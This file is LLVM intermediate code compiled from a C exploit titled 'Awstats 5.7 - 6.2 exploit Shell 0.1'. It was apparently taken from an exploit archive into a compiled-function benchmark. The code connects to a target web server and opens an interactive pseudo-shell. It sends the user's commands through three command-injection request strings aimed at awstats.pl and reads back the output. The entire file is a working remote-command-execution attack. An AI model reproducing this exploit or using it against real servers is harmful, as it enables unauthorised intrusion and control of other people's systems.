; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/cgi/webapps/extr_853.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/cgi/webapps/extr_853.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.hostent = type { i8*, i64 }
%struct.sockaddr = type { i32 }

@CMD_BUFFER = common dso_local global i32 0, align 4
@IN_BUFFER = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [37 x i8] c"Awstats 5.7 - 6.2 exploit Shell 0.1\0A\00", align 1
@.str.1 = private unnamed_addr constant [17 x i8] c"code by omin0us\0A\00", align 1
@.str.2 = private unnamed_addr constant [22 x i8] c"dtors security group\0A\00", align 1
@.str.3 = private unnamed_addr constant [27 x i8] c".: http://dtors.ath.cx :.\0A\00", align 1
@.str.4 = private unnamed_addr constant [40 x i8] c"--------------------------------------\0A\00", align 1
@.str.5 = private unnamed_addr constant [6 x i8] c"h:d:v\00", align 1
@optarg = common dso_local global i8* null, align 8
@optind = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.7 = private unnamed_addr constant [23 x i8] c"Please specify a Host\0A\00", align 1
@.str.8 = private unnamed_addr constant [20 x i8] c"/cgi-bin/awstats.pl\00", align 1
@.str.9 = private unnamed_addr constant [105 x i8] c"select exploit method:\0A\091. ?configdir=|cmd}\0A\092. ?update=1&logfile=|cmd|\0A\093. ?pluginmode=:system(\22cmd\22);\0A\00", align 1
@.str.10 = private unnamed_addr constant [18 x i8] c"\0Amethod [1/2/3]? \00", align 1
@.str.11 = private unnamed_addr constant [36 x i8] c"starting shell...\0A(ctrl+c to exit)\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [23 x i8] c"Error creating socket\0A\00", align 1
@.str.13 = private unnamed_addr constant [23 x i8] c"Could not resolv host\0A\00", align 1
@PORT = common dso_local global i32 0, align 4
@.str.14 = private unnamed_addr constant [8 x i8] c"sh3ll> \00", align 1
@stdin = common dso_local global i32 0, align 4
@.str.15 = private unnamed_addr constant [26 x i8] c"Connecting to %s (%s)...\0A\00", align 1
@.str.16 = private unnamed_addr constant [27 x i8] c"Count not connect to host\0A\00", align 1
@.str.17 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.18 = private unnamed_addr constant [17 x i8] c"Sending Request\0A\00", align 1
@.str.19 = private unnamed_addr constant [59 x i8] c"GET %s?configdir=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\0A\0A\00", align 1
@MAGIC_START = common dso_local global i8* null, align 8
@MAGIC_STOP = common dso_local global i8* null, align 8
@.str.20 = private unnamed_addr constant [66 x i8] c"GET %s?update=1&logfile=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\0A\0A\00", align 1
@.str.21 = private unnamed_addr constant [92 x i8] c"GET %s?pluginmode=:system(\22echo+%s;%s;echo+%s\22); HTTP/1.0\0AConnection: Keep-Alive\0AHost: %s\0A\0A\00", align 1
@.str.22 = private unnamed_addr constant [31 x i8] c"flag [-] incoming buffer full\0A\00", align 1
@.str.23 = private unnamed_addr constant [29 x i8] c"exploitation of host failed\0A\00", align 1
@.str.24 = private unnamed_addr constant [34 x i8] c"putchar [-] incoming buffer full\0A\00", align 1
@.str.25 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@SHUT_WR = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct.hostent*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  %14 = alloca i64, align 8
  %15 = alloca i64, align 8
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i8, align 1
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %10, align 8
  store i8* null, i8** %11, align 8
  %24 = load i32, i32* @CMD_BUFFER, align 4
  %25 = zext i32 %24 to i64
  %26 = call i8* @llvm.stacksave()
  store i8* %26, i8** %12, align 8
  %27 = alloca i8, i64 %25, align 16
  store i64 %25, i64* %13, align 8
  %28 = load i32, i32* @CMD_BUFFER, align 4
  %29 = mul nsw i32 %28, 3
  %30 = zext i32 %29 to i64
  %31 = alloca i8, i64 %30, align 16
  store i64 %30, i64* %14, align 8
  %32 = load i32, i32* @IN_BUFFER, align 4
  %33 = zext i32 %32 to i64
  %34 = alloca i8, i64 %33, align 16
  store i64 %33, i64* %15, align 8
  store i32 0, i32* %23, align 4
  %35 = load i32, i32* %4, align 4
  %36 = icmp slt i32 %35, 2
  br i1 %36, label %37, label %40

37:                                               ; preds = %2
  %38 = load i8**, i8*** %5, align 8
  %39 = call i32 @usage(i8** %38)
  br label %40

40:                                               ; preds = %37, %2
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0))
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.1, i64 0, i64 0))
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.2, i64 0, i64 0))
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.3, i64 0, i64 0))
  %45 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.4, i64 0, i64 0))
  br label %46

46:                                               ; preds = %61, %40
  br label %47

47:                                               ; preds = %46
  %48 = load i32, i32* %4, align 4
  %49 = load i8**, i8*** %5, align 8
  %50 = call signext i8 @getopt(i32 %48, i8** %49, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i64 0, i64 0))
  store i8 %50, i8* %18, align 1
  %51 = load i8, i8* %18, align 1
  %52 = sext i8 %51 to i32
  %53 = icmp slt i32 %52, 0
  br i1 %53, label %54, label %55

54:                                               ; preds = %47
  br label %62

55:                                               ; preds = %47
  %56 = load i8, i8* %18, align 1
  %57 = sext i8 %56 to i32
  switch i32 %57, label %61 [
    i32 118, label %58
    i32 100, label %59
  ]

58:                                               ; preds = %55
  store i32 1, i32* %23, align 4
  br label %61

59:                                               ; preds = %55
  %60 = load i8*, i8** @optarg, align 8
  store i8* %60, i8** %11, align 8
  br label %61

61:                                               ; preds = %55, %59, %58
  br label %46

62:                                               ; preds = %54
  %63 = load i32, i32* @optind, align 4
  %64 = load i32, i32* %4, align 4
  %65 = icmp sge i32 %63, %64
  br i1 %65, label %74, label %66

66:                                               ; preds = %62
  %67 = load i8**, i8*** %5, align 8
  %68 = load i32, i32* @optind, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8*, i8** %67, i64 %69
  %71 = load i8*, i8** %70, align 8
  %72 = call i64 @strcmp(i8* %71, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i64 0, i64 0))
  %73 = icmp eq i64 %72, 0
  br i1 %73, label %74, label %78

74:                                               ; preds = %66, %62
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.7, i64 0, i64 0))
  %76 = load i8**, i8*** %5, align 8
  %77 = call i32 @usage(i8** %76)
  br label %78

78:                                               ; preds = %74, %66
  %79 = load i8*, i8** %11, align 8
  %80 = icmp ne i8* %79, null
  br i1 %80, label %82, label %81

81:                                               ; preds = %78
  store i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.8, i64 0, i64 0), i8** %11, align 8
  br label %82

82:                                               ; preds = %81, %78
  %83 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.9, i64 0, i64 0))
  br label %84

84:                                               ; preds = %95, %82
  %85 = load i32, i32* %22, align 4
  %86 = icmp ne i32 %85, 49
  br i1 %86, label %87, label %93

87:                                               ; preds = %84
  %88 = load i32, i32* %22, align 4
  %89 = icmp ne i32 %88, 50
  br i1 %89, label %90, label %93

90:                                               ; preds = %87
  %91 = load i32, i32* %22, align 4
  %92 = icmp ne i32 %91, 51
  br label %93

93:                                               ; preds = %90, %87, %84
  %94 = phi i1 [ false, %87 ], [ false, %84 ], [ %92, %90 ]
  br i1 %94, label %95, label %98

95:                                               ; preds = %93
  %96 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.10, i64 0, i64 0))
  %97 = call i32 (...) @getchar()
  store i32 %97, i32* %22, align 4
  br label %84

98:                                               ; preds = %93
  %99 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.11, i64 0, i64 0))
  br label %100

100:                                              ; preds = %333, %98
  br label %101

101:                                              ; preds = %100
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %102 = load i32, i32* @CMD_BUFFER, align 4
  %103 = call i32 @memset(i8* %27, i32 0, i32 %102)
  %104 = load i32, i32* @CMD_BUFFER, align 4
  %105 = mul nsw i32 %104, 3
  %106 = call i32 @memset(i8* %31, i32 0, i32 %105)
  %107 = load i32, i32* @IN_BUFFER, align 4
  %108 = call i32 @memset(i8* %34, i32 0, i32 %107)
  %109 = load i32, i32* @AF_INET, align 4
  %110 = load i32, i32* @SOCK_STREAM, align 4
  %111 = call i32 @socket(i32 %109, i32 %110, i32 0)
  store i32 %111, i32* %7, align 4
  %112 = icmp slt i32 %111, 0
  br i1 %112, label %113, label %116

113:                                              ; preds = %101
  %114 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.12, i64 0, i64 0))
  %115 = call i32 @exit(i32 1) #5
  unreachable

116:                                              ; preds = %101
  %117 = load i8**, i8*** %5, align 8
  %118 = load i32, i32* @optind, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds i8*, i8** %117, i64 %119
  %121 = load i8*, i8** %120, align 8
  %122 = call %struct.hostent* @gethostbyname(i8* %121)
  store %struct.hostent* %122, %struct.hostent** %9, align 8
  %123 = icmp eq %struct.hostent* %122, null
  br i1 %123, label %124, label %127

124:                                              ; preds = %116
  %125 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.13, i64 0, i64 0))
  %126 = call i32 @exit(i32 1) #5
  unreachable

127:                                              ; preds = %116
  %128 = load i32, i32* @AF_INET, align 4
  %129 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  store i32 %128, i32* %129, align 4
  %130 = load i32, i32* @PORT, align 4
  %131 = call i32 @htons(i32 %130)
  %132 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i32 %131, i32* %132, align 4
  %133 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %134 = load %struct.hostent*, %struct.hostent** %9, align 8
  %135 = getelementptr inbounds %struct.hostent, %struct.hostent* %134, i32 0, i32 1
  %136 = load i64, i64* %135, align 8
  %137 = inttoptr i64 %136 to %struct.in_addr*
  %138 = bitcast %struct.in_addr* %133 to i8*
  %139 = bitcast %struct.in_addr* %137 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %138, i8* align 4 %139, i64 4, i1 false)
  %140 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.14, i64 0, i64 0))
  %141 = load i32, i32* @CMD_BUFFER, align 4
  %142 = sub nsw i32 %141, 1
  %143 = load i32, i32* @stdin, align 4
  %144 = call i32 @fgets(i8* %27, i32 %142, i32 %143)
  %145 = load i32, i32* %23, align 4
  %146 = icmp ne i32 %145, 0
  br i1 %146, label %147, label %159

147:                                              ; preds = %127
  %148 = load %struct.hostent*, %struct.hostent** %9, align 8
  %149 = getelementptr inbounds %struct.hostent, %struct.hostent* %148, i32 0, i32 0
  %150 = load i8*, i8** %149, align 8
  %151 = load %struct.hostent*, %struct.hostent** %9, align 8
  %152 = getelementptr inbounds %struct.hostent, %struct.hostent* %151, i32 0, i32 1
  %153 = load i64, i64* %152, align 8
  %154 = inttoptr i64 %153 to %struct.in_addr*
  %155 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %154, i32 0, i32 0
  %156 = load i32, i32* %155, align 4
  %157 = call i8* @inet_ntoa(i32 %156)
  %158 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.15, i64 0, i64 0), i8* %150, i8* %157)
  br label %159

159:                                              ; preds = %147, %127
  %160 = load i32, i32* %7, align 4
  %161 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %162 = call i64 @connect(i32 %160, %struct.sockaddr* %161, i32 12)
  %163 = icmp ne i64 %162, 0
  br i1 %163, label %164, label %167

164:                                              ; preds = %159
  %165 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.16, i64 0, i64 0))
  %166 = call i32 @exit(i32 1) #5
  unreachable

167:                                              ; preds = %159
  %168 = load i32, i32* %7, align 4
  %169 = call i32* @fdopen(i32 %168, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.17, i64 0, i64 0))
  store i32* %169, i32** %6, align 8
  %170 = load i32*, i32** %6, align 8
  %171 = call i32 @setbuf(i32* %170, i32* null)
  %172 = call i32 @strlen(i8* %27)
  %173 = sub nsw i32 %172, 1
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds i8, i8* %27, i64 %174
  store i8 0, i8* %175, align 1
  %176 = call i32 @strlen(i8* %27)
  %177 = icmp eq i32 %176, 0
  br i1 %177, label %178, label %182

178:                                              ; preds = %167
  %179 = getelementptr inbounds i8, i8* %27, i64 0
  store i8 105, i8* %179, align 16
  %180 = getelementptr inbounds i8, i8* %27, i64 1
  store i8 100, i8* %180, align 1
  %181 = getelementptr inbounds i8, i8* %27, i64 3
  store i8 0, i8* %181, align 1
  br label %182

182:                                              ; preds = %178, %167
  store i32 0, i32* %19, align 4
  br label %183

183:                                              ; preds = %215, %182
  %184 = load i32, i32* %19, align 4
  %185 = call i32 @strlen(i8* %27)
  %186 = icmp slt i32 %184, %185
  br i1 %186, label %187, label %218

187:                                              ; preds = %183
  %188 = load i32, i32* %19, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds i8, i8* %27, i64 %189
  %191 = load i8, i8* %190, align 1
  store i8 %191, i8* %17, align 1
  %192 = load i8, i8* %17, align 1
  %193 = sext i8 %192 to i32
  %194 = icmp eq i32 %193, 32
  br i1 %194, label %195, label %208

195:                                              ; preds = %187
  %196 = load i32, i32* %20, align 4
  %197 = add nsw i32 %196, 1
  store i32 %197, i32* %20, align 4
  %198 = sext i32 %196 to i64
  %199 = getelementptr inbounds i8, i8* %31, i64 %198
  store i8 37, i8* %199, align 1
  %200 = load i32, i32* %20, align 4
  %201 = add nsw i32 %200, 1
  store i32 %201, i32* %20, align 4
  %202 = sext i32 %200 to i64
  %203 = getelementptr inbounds i8, i8* %31, i64 %202
  store i8 50, i8* %203, align 1
  %204 = load i32, i32* %20, align 4
  %205 = add nsw i32 %204, 1
  store i32 %205, i32* %20, align 4
  %206 = sext i32 %204 to i64
  %207 = getelementptr inbounds i8, i8* %31, i64 %206
  store i8 48, i8* %207, align 1
  br label %214

208:                                              ; preds = %187
  %209 = load i8, i8* %17, align 1
  %210 = load i32, i32* %20, align 4
  %211 = add nsw i32 %210, 1
  store i32 %211, i32* %20, align 4
  %212 = sext i32 %210 to i64
  %213 = getelementptr inbounds i8, i8* %31, i64 %212
  store i8 %209, i8* %213, align 1
  br label %214

214:                                              ; preds = %208, %195
  br label %215

215:                                              ; preds = %214
  %216 = load i32, i32* %19, align 4
  %217 = add nsw i32 %216, 1
  store i32 %217, i32* %19, align 4
  br label %183

218:                                              ; preds = %183
  %219 = load i32, i32* %20, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds i8, i8* %31, i64 %220
  store i8 0, i8* %221, align 1
  %222 = load i32, i32* %22, align 4
  %223 = icmp eq i32 %222, 49
  br i1 %223, label %224, label %239

224:                                              ; preds = %218
  %225 = load i32, i32* %23, align 4
  %226 = icmp ne i32 %225, 0
  br i1 %226, label %227, label %233

227:                                              ; preds = %224
  %228 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.18, i64 0, i64 0))
  %229 = load i8*, i8** %11, align 8
  %230 = load i8*, i8** @MAGIC_START, align 8
  %231 = load i8*, i8** @MAGIC_STOP, align 8
  %232 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.19, i64 0, i64 0), i8* %229, i8* %230, i8* %31, i8* %231)
  br label %233

233:                                              ; preds = %227, %224
  %234 = load i32*, i32** %6, align 8
  %235 = load i8*, i8** %11, align 8
  %236 = load i8*, i8** @MAGIC_START, align 8
  %237 = load i8*, i8** @MAGIC_STOP, align 8
  %238 = call i32 (i32*, i8*, i8*, i8*, i8*, i8*, ...) @fprintf(i32* %234, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.19, i64 0, i64 0), i8* %235, i8* %236, i8* %31, i8* %237)
  br label %239

239:                                              ; preds = %233, %218
  %240 = load i32, i32* %22, align 4
  %241 = icmp eq i32 %240, 50
  br i1 %241, label %242, label %257

242:                                              ; preds = %239
  %243 = load i32, i32* %23, align 4
  %244 = icmp ne i32 %243, 0
  br i1 %244, label %245, label %251

245:                                              ; preds = %242
  %246 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.18, i64 0, i64 0))
  %247 = load i8*, i8** %11, align 8
  %248 = load i8*, i8** @MAGIC_START, align 8
  %249 = load i8*, i8** @MAGIC_STOP, align 8
  %250 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.20, i64 0, i64 0), i8* %247, i8* %248, i8* %31, i8* %249)
  br label %251

251:                                              ; preds = %245, %242
  %252 = load i32*, i32** %6, align 8
  %253 = load i8*, i8** %11, align 8
  %254 = load i8*, i8** @MAGIC_START, align 8
  %255 = load i8*, i8** @MAGIC_STOP, align 8
  %256 = call i32 (i32*, i8*, i8*, i8*, i8*, i8*, ...) @fprintf(i32* %252, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.20, i64 0, i64 0), i8* %253, i8* %254, i8* %31, i8* %255)
  br label %257

257:                                              ; preds = %251, %239
  %258 = load i32, i32* %22, align 4
  %259 = icmp eq i32 %258, 51
  br i1 %259, label %260, label %285

260:                                              ; preds = %257
  %261 = load i32, i32* %23, align 4
  %262 = icmp ne i32 %261, 0
  br i1 %262, label %263, label %274

263:                                              ; preds = %260
  %264 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.18, i64 0, i64 0))
  %265 = load i8*, i8** %11, align 8
  %266 = load i8*, i8** @MAGIC_START, align 8
  %267 = load i8*, i8** @MAGIC_STOP, align 8
  %268 = load i8**, i8*** %5, align 8
  %269 = load i32, i32* @optind, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds i8*, i8** %268, i64 %270
  %272 = load i8*, i8** %271, align 8
  %273 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.21, i64 0, i64 0), i8* %265, i8* %266, i8* %31, i8* %267, i8* %272)
  br label %274

274:                                              ; preds = %263, %260
  %275 = load i32*, i32** %6, align 8
  %276 = load i8*, i8** %11, align 8
  %277 = load i8*, i8** @MAGIC_START, align 8
  %278 = load i8*, i8** @MAGIC_STOP, align 8
  %279 = load i8**, i8*** %5, align 8
  %280 = load i32, i32* @optind, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds i8*, i8** %279, i64 %281
  %283 = load i8*, i8** %282, align 8
  %284 = call i32 (i32*, i8*, i8*, i8*, i8*, i8*, ...) @fprintf(i32* %275, i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.21, i64 0, i64 0), i8* %276, i8* %277, i8* %31, i8* %278, i8* %283)
  br label %285

285:                                              ; preds = %274, %257
  store i32 0, i32* %19, align 4
  br label %286

286:                                              ; preds = %310, %285
  %287 = load i8*, i8** @MAGIC_START, align 8
  %288 = call i32* @strstr(i8* %34, i8* %287)
  %289 = icmp eq i32* %288, null
  br i1 %289, label %290, label %311

290:                                              ; preds = %286
  %291 = load i32, i32* %7, align 4
  %292 = call i32 @read(i32 %291, i8* %16, i32 1)
  store i32 %292, i32* %21, align 4
  %293 = load i8, i8* %16, align 1
  %294 = load i32, i32* %19, align 4
  %295 = add nsw i32 %294, 1
  store i32 %295, i32* %19, align 4
  %296 = sext i32 %294 to i64
  %297 = getelementptr inbounds i8, i8* %34, i64 %296
  store i8 %293, i8* %297, align 1
  %298 = load i32, i32* %19, align 4
  %299 = load i32, i32* @IN_BUFFER, align 4
  %300 = icmp sge i32 %298, %299
  br i1 %300, label %301, label %304

301:                                              ; preds = %290
  %302 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.22, i64 0, i64 0))
  %303 = call i32 @exit(i32 1) #5
  unreachable

304:                                              ; preds = %290
  %305 = load i32, i32* %21, align 4
  %306 = icmp eq i32 %305, 0
  br i1 %306, label %307, label %310

307:                                              ; preds = %304
  %308 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.23, i64 0, i64 0))
  %309 = call i32 @exit(i32 1) #5
  unreachable

310:                                              ; preds = %304
  br label %286

311:                                              ; preds = %286
  br label %312

312:                                              ; preds = %332, %311
  %313 = load i8*, i8** @MAGIC_STOP, align 8
  %314 = call i32* @strstr(i8* %34, i8* %313)
  %315 = icmp eq i32* %314, null
  br i1 %315, label %316, label %333

316:                                              ; preds = %312
  %317 = load i32, i32* %7, align 4
  %318 = call i32 @read(i32 %317, i8* %16, i32 1)
  %319 = load i8, i8* %16, align 1
  %320 = load i32, i32* %19, align 4
  %321 = add nsw i32 %320, 1
  store i32 %321, i32* %19, align 4
  %322 = sext i32 %320 to i64
  %323 = getelementptr inbounds i8, i8* %34, i64 %322
  store i8 %319, i8* %323, align 1
  %324 = load i8, i8* %16, align 1
  %325 = call i32 @putchar(i8 signext %324)
  %326 = load i32, i32* %19, align 4
  %327 = load i32, i32* @IN_BUFFER, align 4
  %328 = icmp sge i32 %326, %327
  br i1 %328, label %329, label %332

329:                                              ; preds = %316
  %330 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.24, i64 0, i64 0))
  %331 = call i32 @exit(i32 1) #5
  unreachable

332:                                              ; preds = %316
  br label %312

333:                                              ; preds = %312
  %334 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.25, i64 0, i64 0))
  %335 = load i32, i32* %7, align 4
  %336 = load i32, i32* @SHUT_WR, align 4
  %337 = call i32 @shutdown(i32 %335, i32 %336)
  %338 = load i32, i32* %7, align 4
  %339 = call i32 @close(i32 %338)
  %340 = load i32*, i32** %6, align 8
  %341 = call i32 @fclose(i32* %340)
  br label %100
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @usage(i8**) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local signext i8 @getopt(i32, i8**, i8*) #2

declare dso_local i64 @strcmp(i8*, i8*) #2

declare dso_local i32 @getchar(...) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @htons(i32) #2

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #4

declare dso_local i32 @fgets(i8*, i32, i32) #2

declare dso_local i8* @inet_ntoa(i32) #2

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32* @fdopen(i32, i8*) #2

declare dso_local i32 @setbuf(i32*, i32*) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @fprintf(i32*, i8*, i8*, i8*, i8*, i8*, ...) #2

declare dso_local i32* @strstr(i8*, i8*) #2

declare dso_local i32 @read(i32, i8*, i32) #2

declare dso_local i32 @putchar(i8 signext) #2

declare dso_local i32 @shutdown(i32, i32) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @fclose(i32*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind willreturn }
attributes #5 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
